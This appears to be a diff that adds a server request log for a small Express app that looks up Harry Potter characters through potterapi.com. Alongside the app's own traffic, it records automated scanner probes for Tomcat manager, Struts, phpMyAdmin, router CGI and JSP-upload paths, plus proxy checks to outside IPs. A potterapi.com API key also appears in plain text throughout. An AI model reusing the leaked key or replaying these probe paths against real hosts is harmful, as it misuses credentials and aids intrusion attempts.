+[0mGET / [32m200 [0m0.659 ms - 1455[0m
+[0mGET / [32m200 [0m0.589 ms - 1455[0m
+[0mGET / [32m200 [0m1.112 ms - 1455[0m
+[0mGET /struts2-rest-showcase/orders.xhtml [33m404 [0m0.848 ms - 1642[0m
+[0mGET /index.action [33m404 [0m1.179 ms - 1642[0m
+[0mGET /index.do [33m404 [0m0.809 ms - 1642[0m
+[0mGET / [32m200 [0m0.582 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.791 ms - 1455[0m
+[0mGET / [32m200 [0m0.444 ms - 1455[0m
+[0mGET / [32m200 [0m0.566 ms - 1455[0m
+[0mGET / [32m200 [0m0.576 ms - 1455[0m
+[0mGET / [32m200 [0m5.058 ms - 1455[0m
+[0mGET / [32m200 [0m0.598 ms - 1455[0m
+[0mGET / [32m200 [0m0.591 ms - 1455[0m
+[0mGET / [32m200 [0m0.569 ms - 1455[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET / [32m200 [0m0.540 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.554 ms - 1455[0m
+[0mGET / [32m200 [0m0.574 ms - 1455[0m
+[0mGET / [32m200 [0m0.577 ms - 1455[0m
+[0mGET / [32m200 [0m0.587 ms - 1455[0m
+[0mGET / [32m200 [0m0.590 ms - 1455[0m
+[0mGET / [32m200 [0m0.579 ms - 1455[0m
+[0mGET / [32m200 [0m0.713 ms - 1455[0m
+[0mGET / [32m200 [0m0.607 ms - 1455[0m
+[0mGET / [32m200 [0m0.610 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.588 ms - 1455[0m
+[0mGET / [32m200 [0m0.634 ms - 1455[0m
+[0mGET / [32m200 [0m0.574 ms - 1455[0m
+[0mGET / [32m200 [0m0.583 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.587 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.859 ms - 1642[0m
+[0mGET / [32m200 [0m0.633 ms - 1455[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.611 ms - 1455[0m
+[0mGET / [32m200 [0m0.570 ms - 1455[0m
+[0mPOST /zabbix/index.php [33m404 [0m277.475 ms - 1637[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.839 ms - 1642[0m
+[0mGET / [32m200 [0m0.577 ms - 1455[0m
+[0mGET / [32m200 [0m0.622 ms - 1455[0m
+[0mGET / [32m200 [0m0.612 ms - 1455[0m
+[0mGET / [32m200 [0m0.641 ms - 1455[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET http://5.188.210.12/echo.php [33m404 [0m1.049 ms - 1642[0m
+[0mGET / [32m200 [0m0.621 ms - 1455[0m
+[0mGET / [32m200 [0m0.583 ms - 1455[0m
+[0mGET / [32m200 [0m0.567 ms - 1455[0m
+[0mGET / [32m200 [0m0.588 ms - 1455[0m
+[0mGET / [32m200 [0m0.643 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.862 ms - 1642[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.788 ms - 1642[0m
+[0mGET / [32m200 [0m0.549 ms - 1455[0m
+[0mGET / [32m200 [0m2.445 ms - 1455[0m
+[0mGET / [32m200 [0m0.896 ms - 1455[0m
+[0mGET / [32m200 [0m0.742 ms - 1455[0m
+[0mGET / [32m200 [0m0.823 ms - 1455[0m
+[0mGET / [32m200 [0m0.654 ms - 1455[0m
+[0mGET / [32m200 [0m0.633 ms - 1455[0m
+[0mGET / [32m200 [0m0.683 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m5.107 ms - 1642[0m
+[0mGET / [32m200 [0m0.656 ms - 1455[0m
+[0mGET / [32m200 [0m0.643 ms - 1455[0m
+[0mGET / [32m200 [0m0.572 ms - 1455[0m
+[0mGET / [32m200 [0m1.354 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.661 ms - 1455[0m
+[0mGET / [32m200 [0m0.651 ms - 1455[0m
+[0mGET / [32m200 [0m0.632 ms - 1455[0m
+[0mGET / [32m200 [0m0.643 ms - 1455[0m
+[0mGET / [32m200 [0m0.592 ms - 1455[0m
+[0mGET /HNAP1/ [33m404 [0m1.054 ms - 1642[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.624 ms - 1455[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.578 ms - 1455[0m
+[0mGET / [32m200 [0m0.642 ms - 1455[0m
+[0mGET / [32m200 [0m0.674 ms - 1455[0m
+[0mGET / [32m200 [0m1.051 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.644 ms - 1455[0m
+[0mGET / [32m200 [0m0.661 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.894 ms - 1642[0m
+[0mGET http://www.123cha.com [32m200 [0m0.639 ms - 1455[0m
+[0mGET http://api.ipify.org/ [32m200 [0m0.612 ms - 1455[0m
+[0mGET http://www.123cha.com/ [32m200 [0m1.044 ms - 1455[0m
+[0mGET http://www.minghui.org/ [0m- [0m- ms - -[0m
+[0mGET http://boxun.com/ [0m- [0m- ms - -[0m
+[0mGET http://www.rfa.org/english/ [0m- [0m- ms - -[0m
+[0mGET http://www.ip.cn/ [32m200 [0m0.611 ms - 1455[0m
+[0mGET http://www.wujieliulan.com/ [0m- [0m- ms - -[0m
+[0mGET http://www.epochtimes.com/ [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m0.575 ms - 1455[0m
+[0mGET / [32m200 [0m0.628 ms - 1455[0m
+[0mGET / [32m200 [0m0.583 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.844 ms - 1642[0m
+[0mGET / [32m200 [0m0.692 ms - 1455[0m
+[0mGET / [32m200 [0m0.654 ms - 1455[0m
+[0mGET / [32m200 [0m3.395 ms - 1455[0m
+[0mGET / [32m200 [0m0.641 ms - 1455[0m
+[0mGET / [32m200 [0m0.716 ms - 1455[0m
+[0mGET / [32m200 [0m0.643 ms - 1455[0m
+[0mGET / [32m200 [0m0.724 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.650 ms - 1455[0m
+[0mGET / [32m200 [0m0.583 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m1.293 ms - 1642[0m
+[0mGET / [32m200 [0m0.635 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.666 ms - 1455[0m
+[0mGET / [32m200 [0m0.607 ms - 1455[0m
+[0mGET / [32m200 [0m0.606 ms - 1455[0m
+[0mGET / [32m200 [0m0.645 ms - 1455[0m
+[0mGET / [32m200 [0m0.663 ms - 1455[0m
+[0mGET / [32m200 [0m0.948 ms - 1455[0m
+[0mGET / [32m200 [0m0.642 ms - 1455[0m
+[0mGET / [32m200 [0m0.455 ms - 1455[0m
+[0mGET / [32m200 [0m0.774 ms - 1455[0m
+[0mGET / [32m200 [0m2.000 ms - 1455[0m
+[0mGET / [32m200 [0m0.634 ms - 1455[0m
+[0mGET / [32m200 [0m0.563 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.488 ms - 1455[0m
+[0mGET / [32m200 [0m0.481 ms - 1455[0m
+[0mGET / [32m200 [0m1.011 ms - 1455[0m
+[0mGET / [32m200 [0m0.611 ms - 1455[0m
+[0mGET / [32m200 [0m0.619 ms - 1455[0m
+[0mGET / [32m200 [0m1.031 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m1.307 ms - 1642[0m
+[0mGET / [32m200 [0m0.646 ms - 1455[0m
+[0mPOST /tmUnblock.cgi [33m404 [0m1.259 ms - 1637[0m
+[0mGET / [32m200 [0m0.642 ms - 1455[0m
+[0mGET / [32m200 [0m0.625 ms - 1455[0m
+[0mGET / [32m200 [0m0.598 ms - 1455[0m
+[0mGET / [32m200 [0m0.596 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.581 ms - 1455[0m
+[0mGET / [32m200 [0m0.592 ms - 1455[0m
+[0mGET / [32m200 [0m0.617 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.825 ms - 1642[0m
+[0mGET / [32m200 [0m0.648 ms - 1455[0m
+[0mGET / [32m200 [0m0.624 ms - 1455[0m
+[0mGET / [32m200 [0m0.571 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.589 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.834 ms - 1642[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.649 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m0.658 ms - 1455[0m
+[0mGET / [32m200 [0m0.620 ms - 1455[0m
+[0mGET / [32m200 [0m0.657 ms - 1455[0m
+[0mGET / [32m200 [0m0.606 ms - 1455[0m
+[0mGET / [32m200 [0m1.060 ms - 1455[0m
+[0mGET / [32m200 [0m0.608 ms - 1455[0m
+[0mGET / [32m200 [0m0.621 ms - 1455[0m
+[0mGET / [32m200 [0m0.541 ms - 1455[0m
+[0mGET / [32m200 [0m0.714 ms - 1455[0m
+[0mGET / [32m200 [0m0.659 ms - 1455[0m
+[0mGET / [32m200 [0m0.630 ms - 1455[0m
+[0mGET / [32m200 [0m0.667 ms - 1455[0m
+[0mGET / [32m200 [0m0.879 ms - 1455[0m
+[0mGET / [32m200 [0m2.016 ms - 1455[0m
+[0mGET / [32m200 [0m0.840 ms - 1455[0m
+[0mGET / [32m200 [0m0.569 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.872 ms - 1642[0m
+[0mGET /manager/html [33m404 [0m0.846 ms - 1642[0m
+[0mGET / [32m200 [0m0.909 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.851 ms - 1642[0m
+[0mGET / [32m200 [0m0.947 ms - 1455[0m
+[0mGET / [32m200 [0m1.185 ms - 1455[0m
+[0mGET / [32m200 [0m0.612 ms - 1455[0m
+[0mGET / [32m200 [0m0.653 ms - 1455[0m
+[0mGET / [32m200 [0m0.573 ms - 1455[0m
+[0mGET / [32m200 [0m0.624 ms - 1455[0m
+[0mGET / [32m200 [0m0.612 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.713 ms - 1455[0m
+[0mGET / [32m200 [0m1.142 ms - 1455[0m
+[0mGET / [32m200 [0m0.963 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.849 ms - 1642[0m
+[0mGET /manager/html [33m404 [0m0.833 ms - 1642[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET / [32m200 [0m0.630 ms - 1455[0m
+[0mGET / [32m200 [0m0.634 ms - 1455[0m
+[0mGET /script [33m404 [0m0.895 ms - 1642[0m
+[0mGET / [32m200 [0m0.647 ms - 1455[0m
+[0mGET / [32m200 [0m1.068 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.841 ms - 1642[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m0.634 ms - 1455[0m
+[0mGET / [32m200 [0m0.606 ms - 1455[0m
+[0mGET / [32m200 [0m0.671 ms - 1455[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET / [32m200 [0m0.645 ms - 1455[0m
+[0mGET / [32m200 [0m1.186 ms - 1455[0m
+[0mGET / [32m200 [0m1.920 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.540 ms - 1455[0m
+[0mGET / [32m200 [0m0.612 ms - 1455[0m
+[0mGET / [32m200 [0m0.595 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.638 ms - 1455[0m
+[0mGET / [32m200 [0m0.644 ms - 1455[0m
+[0mGET / [32m200 [0m1.097 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.668 ms - 1455[0m
+[0mGET / [32m200 [0m0.591 ms - 1455[0m
+[0mGET / [32m200 [0m0.632 ms - 1455[0m
+[0mGET / [32m200 [0m3.639 ms - 1455[0m
+[0mGET / [32m200 [0m1.063 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mPOST /phpmyadmin/index.php [33m404 [0m0.931 ms - 1637[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.632 ms - 1455[0m
+[0mGET / [32m200 [0m0.611 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mGET / [32m200 [0m0.586 ms - 1455[0m
+[0mGET / [32m200 [0m0.631 ms - 1455[0m
+[0mGET / [32m200 [0m0.609 ms - 1455[0m
+[0mGET / [32m200 [0m0.541 ms - 1455[0m
+[0mGET / [32m200 [0m0.597 ms - 1455[0m
+[0mGET / [32m200 [0m0.643 ms - 1455[0m
+[0mGET / [32m200 [0m0.614 ms - 1455[0m
+[0mGET / [32m200 [0m0.590 ms - 1455[0m
+[0mGET / [32m200 [0m0.593 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m0.606 ms - 1455[0m
+[0mGET / [32m200 [0m0.657 ms - 1455[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET / [32m200 [0m0.686 ms - 1455[0m
+[0mGET / [32m200 [0m0.593 ms - 1455[0m
+[0mGET / [32m200 [0m0.620 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.616 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m0.673 ms - 1455[0m
+[0mGET / [32m200 [0m0.694 ms - 1455[0m
+[0mGET / [32m200 [0m0.603 ms - 1455[0m
+[0mPOST /tmUnblock.cgi [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m0.636 ms - 1455[0m
+[0mGET / [32m200 [0m0.624 ms - 1455[0m
+[0mGET / [32m200 [0m0.751 ms - 1455[0m
+[0mGET / [32m200 [0m0.591 ms - 1455[0m
+[0mGET / [32m200 [0m0.598 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mPOST /tmUnblock.cgi [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m0.637 ms - 1455[0m
+[0mGET / [32m200 [0m0.616 ms - 1455[0m
+[0mGET / [32m200 [0m1.062 ms - 1455[0m
+[0mGET / [32m200 [0m0.612 ms - 1455[0m
+[0mGET / [32m200 [0m1.100 ms - 1455[0m
+[0mGET / [32m200 [0m0.563 ms - 1455[0m
+[0mGET / [32m200 [0m0.613 ms - 1455[0m
+[0mGET / [32m200 [0m0.649 ms - 1455[0m
+[0mGET / [32m200 [0m6.027 ms - 1455[0m
+[0mGET / [32m200 [0m0.590 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.636 ms - 1455[0m
+[0mGET / [32m200 [0m0.549 ms - 1455[0m
+[0mGET / [32m200 [0m0.583 ms - 1455[0m
+[0mGET / [32m200 [0m0.659 ms - 1455[0m
+[0mGET / [32m200 [0m0.563 ms - 1455[0m
+[0mGET / [32m200 [0m0.575 ms - 1455[0m
+[0mGET http://95.179.131.215/judge/ [33m404 [0m0.890 ms - 1642[0m
+[0mGET / [32m200 [0m0.575 ms - 1455[0m
+[0mGET / [32m200 [0m0.582 ms - 1455[0m
+[0mGET / [32m200 [0m0.581 ms - 1455[0m
+[0mGET / [32m200 [0m0.608 ms - 1455[0m
+[0mGET / [32m200 [0m0.593 ms - 1455[0m
+[0mGET / [32m200 [0m0.637 ms - 1455[0m
+[0mGET / [32m200 [0m0.637 ms - 1455[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.542 ms - 1455[0m
+[0mGET / [32m200 [0m0.586 ms - 1455[0m
+[0mGET / [32m200 [0m0.482 ms - 1455[0m
+[0mGET / [32m200 [0m0.596 ms - 1455[0m
+[0mGET / [32m200 [0m0.561 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.858 ms - 1642[0m
+[0mGET / [32m200 [0m0.545 ms - 1455[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET /index.action [33m404 [0m0.821 ms - 1642[0m
+[0mPOST /invoker/readonly [33m404 [0m2.096 ms - 1637[0m
+[0mGET / [32m200 [0m1.156 ms - 1455[0m
+[0mGET / [32m200 [0m0.563 ms - 1455[0m
+[0mGET / [32m200 [0m0.599 ms - 1455[0m
+[0mGET /script [33m404 [0m0.835 ms - 1642[0m
+[0mGET / [32m200 [0m0.568 ms - 1455[0m
+[0mGET / [32m200 [0m0.608 ms - 1455[0m
+[0mGET / [32m200 [0m1.087 ms - 1455[0m
+[0mGET / [32m200 [0m0.626 ms - 1455[0m
+[0mGET / [32m200 [0m0.530 ms - 1455[0m
+[0mGET / [32m200 [0m0.595 ms - 1455[0m
+[0mGET / [32m200 [0m0.594 ms - 1455[0m
+[0mGET / [32m200 [0m0.577 ms - 1455[0m
+[0mGET http://5.188.210.12/echo.php [33m404 [0m2.006 ms - 1642[0m
+[0mGET / [32m200 [0m1.088 ms - 1455[0m
+[0mGET / [32m200 [0m0.642 ms - 1455[0m
+[0mGET / [32m200 [0m0.600 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.573 ms - 1455[0m
+[0mGET / [32m200 [0m0.582 ms - 1455[0m
+[0mGET / [36m304 [0m0.483 ms - -[0m
+[0mGET /harryStyles.css [32m200 [0m0.973 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.916 ms - 3853[0m
+https://www.potterapi.com/v1/characters?name=Harry Potter!&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[]
+[0mGET /character/Harry%20Potter! [32m200 [0m248.877 ms - 2[0m
+in getHistory POST route
+{ characterName: 'Harry Potter!' }
+{ _id: 5bfd7ab0e3d32b7d767756fa,
+  characterName: 'Harry Potter!' }
+{ _id: 5bfd7ab0e3d32b7d767756fa,
+  characterName: 'Harry Potter!',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m4.675 ms - 2[0m
+https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[ { _id: '5a12292a0f5ae10021650d7e',
+    name: 'Harry Potter',
+    role: 'student',
+    house: 'Gryffindor',
+    school: 'Hogwarts School of Witchcraft and Wizardry',
+    alias: 'The Boy Who Lived',
+    wand: 'Holly, 11", phoenix feather',
+    boggart: 'dementor',
+    patronus: 'stag',
+    __v: 0,
+    ministryOfMagic: false,
+    orderOfThePhoenix: true,
+    dumbledoresArmy: true,
+    deathEater: false,
+    bloodStatus: 'half-blood',
+    species: 'human' } ]
+[0mGET /character/Harry%20Potter [32m200 [0m81.713 ms - 399[0m
+in getHistory POST route
+{ characterName: 'Harry Potter' }
+{ _id: 5bfd7ab2e3d32b7d767756fb, characterName: 'Harry Potter' }
+{ _id: 5bfd7ab2e3d32b7d767756fb,
+  characterName: 'Harry Potter',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.348 ms - 2[0m
+[0mGET /getHistory [32m200 [0m3.463 ms - 365[0m
+In the DELETE route?
+[0mPOST /delete [32m200 [0m0.457 ms - 2[0m
+collection removed
+[0mGET /? [32m200 [0m0.598 ms - 1455[0m
+[0mGET /harryStyles.css [36m304 [0m0.332 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.885 ms - -[0m
+[0mGET /getHistory [32m200 [0m1.386 ms - 2[0m
+https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[]
+[0mGET /character/HarryPotter [32m200 [0m173.956 ms - 2[0m
+in getHistory POST route
+{ characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756fc,
+  characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756fc,
+  characterName: 'Harry Potter ',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m3.136 ms - 2[0m
+https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[]
+[0mGET /character/HarryPotter [36m304 [0m147.069 ms - -[0m
+https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+in getHistory POST route
+{ characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756fd,
+  characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756fd,
+  characterName: 'Harry Potter ',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m3.748 ms - 2[0m
+[]
+[0mGET /character/HarryPotter [36m304 [0m75.448 ms - -[0m
+https://www.potterapi.com/v1/characters?name=HarryPotter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+in getHistory POST route
+{ characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756fe,
+  characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756fe,
+  characterName: 'Harry Potter ',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.613 ms - 2[0m
+[]
+[0mGET /character/HarryPotter [36m304 [0m108.213 ms - -[0m
+in getHistory POST route
+{ characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756ff,
+  characterName: 'Harry Potter ' }
+{ _id: 5bfd7dbce3d32b7d767756ff,
+  characterName: 'Harry Potter ',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m3.628 ms - 2[0m
+[0mGET /getHistory [32m200 [0m3.337 ms - 301[0m
+https://www.potterapi.com/v1/characters?name=Severus Snape&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[ { _id: '5a1233bc0f5ae10021650d97',
+    name: 'Severus Snape',
+    role: 'Professor, Potions',
+    house: 'Slytherin',
+    school: 'Hogwarts School of Witchcraft and Wizardry',
+    patronus: 'doe',
+    __v: 0,
+    ministryOfMagic: false,
+    orderOfThePhoenix: true,
+    dumbledoresArmy: false,
+    deathEater: true,
+    bloodStatus: 'half-blood',
+    species: 'human' } ]
+[0mGET /character/Severus%20Snape [32m200 [0m76.474 ms - 322[0m
+in getHistory POST route
+{ characterName: 'Severus Snape' }
+{ _id: 5bfd7dc6e3d32b7d76775700,
+  characterName: 'Severus Snape' }
+{ _id: 5bfd7dc6e3d32b7d76775700,
+  characterName: 'Severus Snape',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.347 ms - 2[0m
+[0mGET /getHistory [32m200 [0m2.236 ms - 376[0m
+In the DELETE route?
+[0mPOST /delete [32m200 [0m0.376 ms - 2[0m
+collection removed
+[0mGET /? [36m304 [0m0.359 ms - -[0m
+[0mGET /harryStyles.css [36m304 [0m0.275 ms - -[0m
+[0mGET /harryJS.js [36m304 [0m0.178 ms - -[0m
+[0mGET /getHistory [32m200 [0m1.305 ms - 2[0m
+https://www.potterapi.com/v1/characters?name=Harry Potter&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[ { _id: '5a12292a0f5ae10021650d7e',
+    name: 'Harry Potter',
+    role: 'student',
+    house: 'Gryffindor',
+    school: 'Hogwarts School of Witchcraft and Wizardry',
+    alias: 'The Boy Who Lived',
+    wand: 'Holly, 11", phoenix feather',
+    boggart: 'dementor',
+    patronus: 'stag',
+    __v: 0,
+    ministryOfMagic: false,
+    orderOfThePhoenix: true,
+    dumbledoresArmy: true,
+    deathEater: false,
+    bloodStatus: 'half-blood',
+    species: 'human' } ]
+[0mGET /character/Harry%20Potter [36m304 [0m102.533 ms - -[0m
+in getHistory POST route
+{ characterName: 'Harry Potter' }
+{ _id: 5bfd7dd9e3d32b7d76775701, characterName: 'Harry Potter' }
+{ _id: 5bfd7dd9e3d32b7d76775701,
+  characterName: 'Harry Potter',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m6.267 ms - 2[0m
+https://www.potterapi.com/v1/characters?name=Tom Riddle&key=$2a$10$qHP0eb3Zdr1ZaeDMOvJwH.LgkWvNh4x53UrQz0Wy/RTlALo5grtNO
+[ { _id: '5a122c200f5ae10021650d88',
+    name: 'Tom Riddle',
+    house: 'Slytherin',
+    school: 'Hogwarts School of Witchcraft and Wizardry',
+    alias: 'Lord Voldemort',
+    wand: 'Yew, 13 1/2", phoenix feather core',
+    boggart: 'his own corpse',
+    __v: 0,
+    ministryOfMagic: false,
+    orderOfThePhoenix: false,
+    dumbledoresArmy: false,
+    deathEater: true,
+    bloodStatus: 'half-blood',
+    species: 'human' } ]
+[0mGET /character/Tom%20Riddle [32m200 [0m93.517 ms - 372[0m
+in getHistory POST route
+{ characterName: 'Tom Riddle' }
+{ _id: 5bfd7de0e3d32b7d76775702, characterName: 'Tom Riddle' }
+{ _id: 5bfd7de0e3d32b7d76775702,
+  characterName: 'Tom Riddle',
+  __v: 0 }
+[0mPOST /getHistory [32m200 [0m2.672 ms - 2[0m
+[0mGET /getHistory [32m200 [0m1.689 ms - 147[0m
+[0mGET /? [32m200 [0m0.640 ms - 1455[0m
+[0mGET /harryStyles.css [32m200 [0m0.471 ms - 467[0m
+[0mGET /harryJS.js [32m200 [0m0.424 ms - 3853[0m
+[0mGET /favicon.ico [33m404 [0m1.929 ms - 1642[0m
+[0mGET /getHistory [36m304 [0m2.618 ms - -[0m
+[0mGET / [32m200 [0m0.558 ms - 1455[0m
+[0mGET / [32m200 [0m0.684 ms - 1455[0m
+[0mGET / [32m200 [0m0.601 ms - 1455[0m
+[0mGET / [32m200 [0m0.618 ms - 1455[0m
+[0mGET / [32m200 [0m0.648 ms - 1455[0m
+[0mGET /favicon.ico [33m404 [0m1.416 ms - 1642[0m
+[0mGET / [32m200 [0m0.585 ms - 1455[0m
+[0mGET / [32m200 [0m0.551 ms - 1455[0m
+[0mGET / [32m200 [0m0.566 ms - 1455[0m
+[0mGET / [32m200 [0m0.622 ms - 1455[0m
+[0mGET / [32m200 [0m0.647 ms - 1455[0m
+[0mGET / [32m200 [0m0.560 ms - 1455[0m
+[0mPUT /hbWDoIVBIu.jsp/ [33m404 [0m1.826 ms - 1637[0m
+[0mHEAD /manager/html [33m404 [0m0.889 ms - 1642[0m
+[0mGET / [32m200 [0m1.101 ms - 1455[0m
+[0mGET / [32m200 [0m0.654 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m3.336 ms - 1642[0m
+[0mGET /manager/html [33m404 [0m0.857 ms - 1642[0m
+[0mGET / [32m200 [0m0.572 ms - 1455[0m
+[0mGET / [32m200 [0m1.371 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m0.855 ms - 1642[0m
+[0mGET / [32m200 [0m0.613 ms - 1455[0m
+[0mGET / [32m200 [0m0.602 ms - 1455[0m
+[0mGET / [32m200 [0m0.604 ms - 1455[0m
+[0mGET / [32m200 [0m0.629 ms - 1455[0m
+[0mGET / [32m200 [0m0.574 ms - 1455[0m
+[0mGET / [32m200 [0m0.581 ms - 1455[0m
+[0mGET / [32m200 [0m0.584 ms - 1455[0m
+[0mGET / [32m200 [0m0.605 ms - 1455[0m
+[0mGET / [32m200 [0m0.594 ms - 1455[0m
+[0mGET /manager/html [33m404 [0m5.663 ms - 1642[0m
+[0mGET / [32m200 [0m0.645 ms - 1455[0m
+[0mGET / [32m200 [0m0.561 ms - 1455[0m
+[0mGET / [32m200 [0m0.992 ms - 1455[0m
+[0mGET / [32m200 [0m0.592 ms - 1455[0m
+[0mGET / [32m200 [0m1.153 ms - 1455[0m
+[0mGET / [32m200 [0m0.559 ms - 1455[0m
+[0mGET / [32m200 [0m0.612 ms - 1455[0m
+[0mGET / [32m200 [0m0.576 ms - 1455[0m
+[0mGET / [32m200 [0m0.635 ms - 1455[0m
+[0mGET / [32m200 [0m0.565 ms - 1455[0m
+[0mGET / [32m200 [0m0.590 ms - 1455[0m
